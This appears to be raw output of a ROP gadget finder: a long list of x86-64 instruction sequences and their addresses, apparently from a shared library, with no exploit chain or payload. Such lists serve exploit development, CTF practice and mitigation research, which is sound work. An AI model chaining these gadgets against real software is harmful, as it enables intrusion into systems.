Gadgets information
============================================================
0x00002aaaaac5c230 : adc ah, ch ; int1 ; jmp qword ptr [rax]
0x00002aaaaac713c5 : adc al, 0 ; add byte ptr [rax + 0x6f], ch ; std ; call qword ptr [rcx]
0x00002aaaaac1b53f : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1b5a9 : adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac81248 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0x13 ; add dword ptr [rax], eax ; sbb dl, 0xf3 ; jmp qword ptr [rcx]
0x00002aaaaac71948 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0x1a ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; jmp qword ptr [rax]
0x00002aaaaac83e48 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0x3f ; add dword ptr [rax], eax ; rcr byte ptr [rdi], 1 ; cmc ; jmp qword ptr [rdx]
0x00002aaaaac84d48 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0x4e ; add dword ptr [rax], eax ; push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac86e48 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0x6f ; add dword ptr [rax], eax ; push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac7bd48 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0xbe ; add byte ptr [rax], al ; and byte ptr [rdi - 0x11], bh ; call qword ptr [rdi]
0x00002aaaaac7ca48 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0xcb ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac7dd48 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0xde ; add byte ptr [rax], al ; add byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac7e448 : adc al, 0 ; add byte ptr [rax], al ; adc al, 0xe5 ; add byte ptr [rax], al ; mov al, 0xe8 ; int1 ; call qword ptr [rbx]
0x00002aaaaac71078 : adc al, 0 ; add byte ptr [rax], al ; adc dword ptr [rax], r8d ; add al, ah ; in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaac73638 : adc al, 0 ; add byte ptr [rax], al ; add al, 0x37 ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac84e38 : adc al, 0 ; add byte ptr [rax], al ; add al, 0x4f ; add dword ptr [rax], eax ; and byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac73578 : adc al, 0 ; add byte ptr [rax], al ; add byte ptr ss:[rax], al ; or ah, 0xe9 ; call qword ptr [rsi]
0x00002aaaaac83598 : adc al, 0 ; add byte ptr [rax], al ; add dword ptr ss:[rax], eax ; nop ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84e98 : adc al, 0 ; add byte ptr [rax], al ; add qword ptr fs:[r8], r8 ; mov al, 0x6f ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac82e58 : adc al, 0 ; add byte ptr [rax], al ; and al, 0x2f ; add dword ptr [rax], eax ; jo 0x1ade4c ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac83d58 : adc al, 0 ; add byte ptr [rax], al ; and al, 0x3e ; add dword ptr [rax], eax ; mov al, 0x1e ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac87058 : adc al, 0 ; add byte ptr [rax], al ; and al, 0x71 ; add dword ptr [rax], eax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac77c58 : adc al, 0 ; add byte ptr [rax], al ; and al, 0x7d ; add byte ptr [rax], al ; nop ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac81f98 : adc al, 0 ; add byte ptr [rax], al ; and byte ptr fs:[rcx], al ; add byte ptr [rax - 0x6d], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81230 : adc al, 0 ; add byte ptr [rax], al ; cld ; adc al, byte ptr [rcx] ; add byte ptr [rax - 0x26], ch ; jmp qword ptr [rcx]
0x00002aaaaac84d30 : adc al, 0 ; add byte ptr [rax], al ; cld ; add qword ptr [r8], r8 ; cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac84c30 : adc al, 0 ; add byte ptr [rax], al ; cld ; add qword ptr [rax], r8 ; cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac84a30 : adc al, 0 ; add byte ptr [rax], al ; cld ; add qword ptr [rax], rax ; cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85030 : adc al, 0 ; add byte ptr [rax], al ; cld ; push rax ; add dword ptr [rax], eax ; test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85330 : adc al, 0 ; add byte ptr [rax], al ; cld ; push rbx ; add dword ptr [rax], eax ; js 0x1b03bb ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7f498 : adc al, 0 ; add byte ptr [rax], al ; cmc ; add byte ptr [rax], al ; add byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac7f480 : adc al, 0 ; add byte ptr [rax], al ; cmc ; add byte ptr [rax], al ; call 0x221a96bb
0x00002aaaaac84970 : adc al, 0 ; add byte ptr [rax], al ; cmp al, 0x4a ; add dword ptr [rax], eax ; fcomp dword ptr [rdx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac84f70 : adc al, 0 ; add byte ptr [rax], al ; cmp al, 0x50 ; add dword ptr [rax], eax ; mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac87070 : adc al, 0 ; add byte ptr [rax], al ; cmp al, 0x71 ; add dword ptr [rax], eax ; pop rax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac7d070 : adc al, 0 ; add byte ptr [rax], al ; cmp al, 0xd1 ; add byte ptr [rax], al ; fdiv st(0) ; call qword ptr [rax]
0x00002aaaaac87010 : adc al, 0 ; add byte ptr [rax], al ; fdiv qword ptr [rax + 1] ; add al, bh ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac7b010 : adc al, 0 ; add byte ptr [rax], al ; fdiv qword ptr [rax - 0x4e780000] ; out dx, al ; call qword ptr [rax]
0x00002aaaaac83d10 : adc al, 0 ; add byte ptr [rax], al ; fdivr qword ptr [rip + 0x1e380001] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7f510 : adc al, 0 ; add byte ptr [rax], al ; fdivr st(5), st(0) ; add byte ptr [rax], al ; sbb byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac84f10 : adc al, 0 ; add byte ptr [rax], al ; fmul qword ptr [rdi + 1] ; add byte ptr [rax], ch ; jo 0x1aff1b ; jmp qword ptr [rcx]
0x00002aaaaac78a10 : adc al, 0 ; add byte ptr [rax], al ; fmul qword ptr [rdx + 0x7fe80000] ; in eax, dx ; call qword ptr [rcx]
0x00002aaaaac82e28 : adc al, 0 ; add byte ptr [rax], al ; hlt ; add dword ptr cs:[rax], eax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac83628 : adc al, 0 ; add byte ptr [rax], al ; hlt ; add dword ptr ss:[rax], eax ; and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84f28 : adc al, 0 ; add byte ptr [rax], al ; hlt ; add qword ptr [r8], r8 ; jo 0x1aff33 ; jmp qword ptr [rcx]
0x00002aaaaac7f528 : adc al, 0 ; add byte ptr [rax], al ; hlt ; cmc ; add byte ptr [rax], al ; xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac83d28 : adc al, 0 ; add byte ptr [rax], al ; hlt ; cmp eax, 0x1e500001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac87028 : adc al, 0 ; add byte ptr [rax], al ; hlt ; jo 0x1b203b ; add byte ptr [rax], dl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac7ac28 : adc al, 0 ; add byte ptr [rax], al ; hlt ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; push rax ; jle 0x1a5c2c ; jmp qword ptr [rcx]
0x00002aaaaac8ef18 : adc al, 0 ; add byte ptr [rax], al ; in al, -0x11 ; add dword ptr [rax], eax ; rcl byte ptr [rdx], 0xf8 ; jmp qword ptr [rbx]
0x00002aaaaac7ca18 : adc al, 0 ; add byte ptr [rax], al ; in al, -0x36 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac7ba18 : adc al, 0 ; add byte ptr [rax], al ; in al, -0x46 ; add byte ptr [rax], al ; sal byte ptr [rbp - 0x11], 1 ; jmp qword ptr [rax]
0x00002aaaaac84e20 : adc al, 0 ; add byte ptr [rax], al ; in al, dx ; add qword ptr [rax], r8 ; or byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac86f20 : adc al, 0 ; add byte ptr [rax], al ; in al, dx ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac78f20 : adc al, 0 ; add byte ptr [rax], al ; in al, dx ; pop qword ptr [rax] ; add al, bl ; mov ebp, gs ; jmp qword ptr [rax]
0x00002aaaaac85620 : adc al, 0 ; add byte ptr [rax], al ; in al, dx ; push rsi ; add dword ptr [rax], eax ; js 0x1b06b0 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac71c20 : adc al, 0 ; add byte ptr [rax], al ; in al, dx ; sbb al, 0 ; add byte ptr [rax], bl ; cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaac8fd20 : adc al, 0 ; add byte ptr [rax], al ; in al, dx ; std ; add dword ptr [rax], eax ; push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaac7ab20 : adc al, 0 ; add byte ptr [rax], al ; in al, dx ; stosd dword ptr [rdi], eax ; add byte ptr [rax], al ; test al, 0x73 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac811a0 : adc al, 0 ; add byte ptr [rax], al ; insb byte ptr [rdi], dx ; adc al, byte ptr [rcx] ; add al, bl ; fpatan ; jmp qword ptr [rcx]
0x00002aaaaac837a0 : adc al, 0 ; add byte ptr [rax], al ; insb byte ptr [rdi], dx ; cmp byte ptr [rcx], al ; add al, bl ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac831a0 : adc al, 0 ; add byte ptr [rax], al ; insb byte ptr [rdi], dx ; xor al, byte ptr [rcx] ; add byte ptr [rax], bh ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac7a2a8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1a525c ; add byte ptr [rax], al ; nop ; in al, -4 ; call qword ptr [rdx]
0x00002aaaaac7ada8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1a5d67 ; add byte ptr [rax], al ; loopne 0x1a5d45 ; out dx, al ; jmp rbx
0x00002aaaaac7caa8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1a7a84 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac822a8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1ad2dc ; add dword ptr [rax], eax ; loopne 0x1ad257 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833a8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1ae3ed ; add dword ptr [rax], eax ; push rax ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84da8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1afe07 ; add dword ptr [rax], eax ; nop ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac850a8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1b010a ; add dword ptr [rax], eax ; push rax ; jb 0x1b00b3 ; jmp qword ptr [rcx]
0x00002aaaaac857a8 : adc al, 0 ; add byte ptr [rax], al ; je 0x1b0811 ; add dword ptr [rax], eax ; jo 0x1b0742 ; cmc ; jmp rax
0x00002aaaaac730b0 : adc al, 0 ; add byte ptr [rax], al ; jl 0x19e0f0 ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac730b0 : adc al, 0 ; add byte ptr [rax], al ; jl 0x19e0f2 ; add byte ptr [rax], al ; clc ; ret
0x00002aaaaac7afb0 : adc al, 0 ; add byte ptr [rax], al ; jl 0x1a5f71 ; add byte ptr [rax], al ; js 0x1a5fdf ; cli ; call qword ptr [rax]
0x00002aaaaac81fb0 : adc al, 0 ; add byte ptr [rax], al ; jl 0x1acfe1 ; add dword ptr [rax], eax ; js 0x1acf58 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac851b0 : adc al, 0 ; add byte ptr [rax], al ; jl 0x1b0213 ; add dword ptr [rax], eax ; fdiv dword ptr [rbx - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaac86fb0 : adc al, 0 ; add byte ptr [rax], al ; jl 0x1b2031 ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac86f80 : adc al, 0 ; add byte ptr [rax], al ; jo 0x1b1f93 ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac84ee0 : adc al, 0 ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; add qword ptr [r8], r8 ; clc ; outsd dx, dword ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7afe0 : adc al, 0 ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; mov al, 0 ; add byte ptr [rax], bl ; push rsp ; cli ; call qword ptr [rax]
0x00002aaaaac853e0 : adc al, 0 ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; push rsp ; add dword ptr [rax], eax ; pop rax ; js 0x1b03eb ; jmp qword ptr [rbx]
0x00002aaaaac811e8 : adc al, 0 ; add byte ptr [rax], al ; mov ah, 0x12 ; add dword ptr [rax], eax ; and dl, bl ; jmp qword ptr [rcx]
0x00002aaaaac718e8 : adc al, 0 ; add byte ptr [rax], al ; mov ah, 0x19 ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; call qword ptr [rbx]
0x00002aaaaac82fe8 : adc al, 0 ; add byte ptr [rax], al ; mov ah, 0x30 ; add dword ptr [rax], eax ; jrcxz 0x1adff2 ; call qword ptr [rsi]
0x00002aaaaac73de8 : adc al, 0 ; add byte ptr [rax], al ; mov ah, 0x3e ; add byte ptr [rax], al ; cli ; jmp qword ptr [rcx]
0x00002aaaaac849e8 : adc al, 0 ; add byte ptr [rax], al ; mov ah, 0x4a ; add dword ptr [rax], eax ; push rax ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84be8 : adc al, 0 ; add byte ptr [rax], al ; mov ah, 0x4c ; add dword ptr [rax], eax ; add byte ptr [rbp - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac7f1c0 : adc al, 0 ; add byte ptr [rax], al ; mov edx, dr0 ; add byte ptr [rax], al ; clc ; sbb edx, esi ; jmp qword ptr [rcx]
0x00002aaaaac825f0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0x18000126 ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac71bf0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0x2800001c ; cmp ch, cl ; call qword ptr [rax]
0x00002aaaaac822f0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0x28000123 ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac855f0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0x48000156 ; jnp 0x1b05fb ; jmp qword ptr [rcx]
0x00002aaaaac781f0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0x68000082 ; pop rcx ; in eax, dx ; call qword ptr [rax]
0x00002aaaaac831f0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0x88000132 ; out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac84df0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0xd800014e ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac86ef0 : adc al, 0 ; add byte ptr [rax], al ; mov esp, 0xf800016f ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac812c0 : adc al, 0 ; add byte ptr [rax], al ; mov word ptr [rbx], ss ; add dword ptr [rax], eax ; or bl, bl ; call qword ptr [rdi]
0x00002aaaaac850c0 : adc al, 0 ; add byte ptr [rax], al ; mov word ptr [rcx + 1], ss ; add byte ptr [rax + 0x72], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac833c0 : adc al, 0 ; add byte ptr [rax], al ; mov word ptr [rcx + rax], dr0 ; add byte ptr [rax - 0x14], ch ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac86ec0 : adc al, 0 ; add byte ptr [rax], al ; mov word ptr [rdi + 1], gs ; add al, bh ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac822d8 : adc al, 0 ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; and eax, dword ptr [rcx] ; add byte ptr [rax], dl ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac7f0d8 : adc al, 0 ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; int1 ; add byte ptr [rax], al ; jo 0x1aa102 ; jmp qword ptr [rcx]
0x00002aaaaac855d8 : adc al, 0 ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; push rsi ; add dword ptr [rax], eax ; xor byte ptr [rbx - 0xb], bh ; jmp qword ptr [rcx]
0x00002aaaaac7cad8 : adc al, 0 ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; retf ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac82e40 : adc al, 0 ; add byte ptr [rax], al ; or al, 0x2f ; add dword ptr [rax], eax ; pop rax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac83140 : adc al, 0 ; add byte ptr [rax], al ; or al, 0x32 ; add dword ptr [rax], eax ; fsub st(6) ; hlt ; jmp qword ptr [rbx]
0x00002aaaaac78840 : adc al, 0 ; add byte ptr [rax], al ; or al, 0x89 ; add byte ptr [rax], al ; fdivr dword ptr [rcx - 0x13] ; jmp qword ptr [rcx]
0x00002aaaaac7a840 : adc al, 0 ; add byte ptr [rax], al ; or al, 0xa9 ; add byte ptr [rax], al ; mov byte ptr [rsi - 0x12], cl ; jmp qword ptr [rdx]
0x00002aaaaac7c640 : adc al, 0 ; add byte ptr [rax], al ; or al, 0xc7 ; add byte ptr [rax], al ; cmp byte ptr [rdi - 0x10], al ; jmp qword ptr [rdi]
0x00002aaaaac7de40 : adc al, 0 ; add byte ptr [rax], al ; or al, 0xdf ; add byte ptr [rax], al ; int1 ; call qword ptr [rdx]
0x00002aaaaac7f540 : adc al, 0 ; add byte ptr [rax], al ; or al, 0xf6 ; add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac90340 : adc al, 0 ; add byte ptr [rax], al ; or al, 4 ; add al, byte ptr [rax] ; cwde ; outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaac86e78 : adc al, 0 ; add byte ptr [rax], al ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; and byte ptr [rdx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaac78090 : adc al, 0 ; add byte ptr [rax], al ; pop rsp ; add dword ptr [rax], 0xed52a800 ; jmp qword ptr [rsi]
0x00002aaaaac86e90 : adc al, 0 ; add byte ptr [rax], al ; pop rsp ; outsd dx, dword ptr [rsi] ; add dword ptr [rax], eax ; cwde ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac85590 : adc al, 0 ; add byte ptr [rax], al ; pop rsp ; push rsi ; add dword ptr [rax], eax ; call 0x221afb22
0x00002aaaaac83390 : adc al, 0 ; add byte ptr [rax], al ; pop rsp ; xor al, 1 ; add byte ptr [rax], bh ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac85078 : adc al, 0 ; add byte ptr [rax], al ; push rcx ; add dword ptr [rax], eax ; and byte ptr [rdx - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac85180 : adc al, 0 ; add byte ptr [rax], al ; push rdx ; add dword ptr [rax], eax ; js 0x1b0208 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85578 : adc al, 0 ; add byte ptr [rax], al ; push rsi ; add dword ptr [rax], eax ; sar byte ptr [rdx - 0xb], 1 ; jmp qword ptr [rcx]
0x00002aaaaac7b988 : adc al, 0 ; add byte ptr [rax], al ; push rsp ; mov edx, 0x73700000 ; out dx, eax ; call rax
0x00002aaaaac86d88 : adc al, 0 ; add byte ptr [rax], al ; push rsp ; outsb dx, byte ptr [rsi] ; add dword ptr [rax], eax ; nop ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac83dd0 : adc al, 0 ; add byte ptr [rax], al ; pushfq ; add dword ptr ds:[rax], eax ; sub byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac84bd0 : adc al, 0 ; add byte ptr [rax], al ; pushfq ; add qword ptr [rax], r8 ; call 0x221af154
0x00002aaaaac7c180 : adc al, 0 ; add byte ptr [rax], al ; ret 0
0x00002aaaaac7ca78 : adc al, 0 ; add byte ptr [rax], al ; retf ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac7c078 : adc al, 0 ; add byte ptr [rax], al ; rol dword ptr [rax], 0 ; shl bl, 1 ; out dx, eax ; call rsp
0x00002aaaaac82650 : adc al, 0 ; add byte ptr [rax], al ; sbb al, 0x27 ; add dword ptr [rax], eax ; js 0x1ad60d ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84e50 : adc al, 0 ; add byte ptr [rax], al ; sbb al, 0x4f ; add dword ptr [rax], eax ; cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaac85150 : adc al, 0 ; add byte ptr [rax], al ; sbb al, 0x52 ; add dword ptr [rax], eax ; sub byte ptr [rbx - 0xb], dh ; call qword ptr [rsi]
0x00002aaaaac86f50 : adc al, 0 ; add byte ptr [rax], al ; sbb al, 0x70 ; add dword ptr [rax], eax ; clc ; sbb cl, bh ; jmp qword ptr [rsi]
0x00002aaaaac7c150 : adc al, 0 ; add byte ptr [rax], al ; sbb al, 0xc2 ; add byte ptr [rax], al ; call 0x281a6b91
0x00002aaaaac7ad78 : adc al, 0 ; add byte ptr [rax], al ; scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; loopne 0x1a5d15 ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac72960 : adc al, 0 ; add byte ptr [rax], al ; sub al, 0x2a ; add byte ptr [rax], al ; pop rax ; mov cl, ch ; jmp qword ptr [rsi]
0x00002aaaaac83c60 : adc al, 0 ; add byte ptr [rax], al ; sub al, 0x3d ; add dword ptr [rax], eax ; sbb al, 0xf5 ; call qword ptr [rdx]
0x00002aaaaac7dd60 : adc al, 0 ; add byte ptr [rax], al ; sub al, 0xde ; add byte ptr [rax], al ; sbb byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaac70060 : adc al, 0 ; add byte ptr [rax], al ; sub al, 1 ; add byte ptr [rax], al ; call 0x111998d0
0x00002aaaaabd113e : adc al, 0 ; add byte ptr [rax], al ; sub eax, edx ; ret
0x00002aaaaac7a780 : adc al, 0 ; add byte ptr [rax], al ; test al, 0 ; add byte ptr [rax + 0x37], cl ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac849b8 : adc al, 0 ; add byte ptr [rax], al ; test byte ptr [rdx + 1], cl ; add byte ptr [rax], ah ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac86db8 : adc al, 0 ; add byte ptr [rax], al ; test byte ptr [rsi + 1], ch ; add al, al ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac83db8 : adc al, 0 ; add byte ptr [rax], al ; test byte ptr [rsi], bh ; add dword ptr [rax], eax ; adc byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac81db8 : adc al, 0 ; add byte ptr [rax], al ; test byte ptr [rsi], bl ; add dword ptr [rax], eax ; loopne 0x1acd5d ; hlt ; call qword ptr [rcx]
0x00002aaaaac7a878 : adc al, 0 ; add byte ptr [rax], al ; test eax, 0x4f200000 ; out dx, al ; call qword ptr [rdx]
0x00002aaaaac710c8 : adc al, 0 ; add byte ptr [rax], al ; xchg eax, esp ; adc dword ptr [rax], eax ; add byte ptr [rax], dl ; jno 0x19c0db ; jmp qword ptr [rdi]
0x00002aaaaac84ec8 : adc al, 0 ; add byte ptr [rax], al ; xchg eax, esp ; add qword ptr [r8], r8 ; loopne 0x1aff4c ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7c1c8 : adc al, 0 ; add byte ptr [rax], al ; xchg eax, esp ; ret 0
0x00002aaaaac82668 : adc al, 0 ; add byte ptr [rax], al ; xor al, 0x27 ; add dword ptr [rax], eax ; nop ; test al, 0xf4 ; jmp qword ptr [rcx]
0x00002aaaaac73668 : adc al, 0 ; add byte ptr [rax], al ; xor al, 0x37 ; add byte ptr [rax], al ; or ch, 0xe9 ; call qword ptr [rdx]
0x00002aaaaac7c168 : adc al, 0 ; add byte ptr [rax], al ; xor al, 0xc2 ; add byte ptr [rax], al ; add byte ptr [rbx], ch ; cli ; call qword ptr [rdi]
0x00002aaaaac7f068 : adc al, 0 ; add byte ptr [rax], al ; xor al, 0xf1 ; add byte ptr [rax], al ; loopne 0x1aa091 ; call qword ptr [rdx]
0x00002aaaaac8f268 : adc al, 0 ; add byte ptr [rax], al ; xor al, 0xf3 ; add dword ptr [rax], eax ; add byte ptr [rsi], dl ; clc ; call qword ptr [rdx]
0x00002aaaaac90768 : adc al, 0 ; add byte ptr [rax], al ; xor al, 8 ; add al, byte ptr [rax] ; add byte ptr [rdx - 8], bh ; call qword ptr [rcx]
0x00002aaaaab09bc6 : adc al, 0 ; andps xmm0, xmm3 ; andnps xmm3, xmm1 ; orps xmm0, xmm3 ; ret
0x00002aaaaab20515 : adc al, 0 ; call 0x777f4
0x00002aaaaab20514 : adc al, 0 ; call 0x777f5
0x00002aaaaab1c065 : adc al, 0 ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab08295 : adc al, 0 ; movsxd rcx, dword ptr [rdi + rcx*4] ; add rcx, rdi ; jmp rcx
0x00002aaaaabff3c5 : adc al, 0x10 ; add byte ptr [rax], al ; add cl, ch ; ret
0x00002aaaaac8124c : adc al, 0x13 ; add dword ptr [rax], eax ; sbb dl, 0xf3 ; jmp qword ptr [rcx]
0x00002aaaaac25505 : adc al, 0x13 ; jmp rdx
0x00002aaaaac6d2d0 : adc al, 0x14 ; cmc ; push qword ptr [rcx + 0x14940001] ; cmc ; call rsp
0x00002aaaaab73a05 : adc al, 0x16 ; sub eax, edx ; ret
0x00002aaaaac19e50 : adc al, 0x16 ; test r8d, r8d ; je 0x144e62 ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac1ae35 : adc al, 0x16 ; test r8d, r8d ; je 0x145e47 ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac7194c : adc al, 0x1a ; add byte ptr [rax], al ; adc byte ptr [rdi], 0xe9 ; jmp qword ptr [rax]
0x00002aaaaac76ec4 : adc al, 0x1a ; add byte ptr [rax], al ; or byte ptr [rcx], bl ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac81c4c : adc al, 0x1d ; add dword ptr [rax], eax ; mov al, 0x66 ; stc ; call qword ptr [rax]
0x00002aaaaac6b5b0 : adc al, 0x20 ; jmp 0x1965b6
0x00002aaaaabd183a : adc al, 0x24 ; add rsp, 0x18 ; mov eax, edx ; ret
0x00002aaaaac6ce18 : adc al, 0x24 ; push qword ptr [rdx + rdi + 0x24540001] ; jmp rsp
0x00002aaaaab0efc8 : adc al, 0x25 ; xor byte ptr [rax], al ; add byte ptr [rax], al ; call rdx
0x00002aaaaac6f558 : adc al, 0x29 ; cli ; jmp rsp
0x00002aaaaab7e233 : adc al, 0x30 ; in eax, dx ; mov byte ptr [rdi + 0x15], ch ; ret
0x00002aaaaab967fb : adc al, 0x31 ; rol byte ptr [rcx - 0x7d], cl ; clc ; add dword ptr [rdi], ecx ; sahf ; ret 0x1fbd
0x00002aaaaab4c3e0 : adc al, 0x31 ; ror byte ptr [rax - 0x7d], 0x7f ; sbb byte ptr [rax], al ; setne al ; ret
0x00002aaaaac8384c : adc al, 0x39 ; add dword ptr [rax], eax ; adc bh, bh ; hlt ; call rsi
0x00002aaaaac83e4c : adc al, 0x3f ; add dword ptr [rax], eax ; rcr byte ptr [rdi], 1 ; cmc ; jmp qword ptr [rdx]
0x00002aaaaab53c4a : adc al, 0x41 ; pop rsp ; ret
0x00002aaaaab7b970 : adc al, 0x48 ; lea eax, dword ptr [rdi + 0x14] ; ret
0x00002aaaaab7c7c3 : adc al, 0x48 ; lea eax, dword ptr [rdi + 0x15] ; ret
0x00002aaaaab735bb : adc al, 0x48 ; lea eax, dword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab4574b : adc al, 0x48 ; lea ecx, dword ptr [rdx + 4] ; mov qword ptr [rax], rcx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab7ac31 : adc al, 0x48 ; lea edi, dword ptr [rdi + 0x14] ; jne 0xa628b ; ret
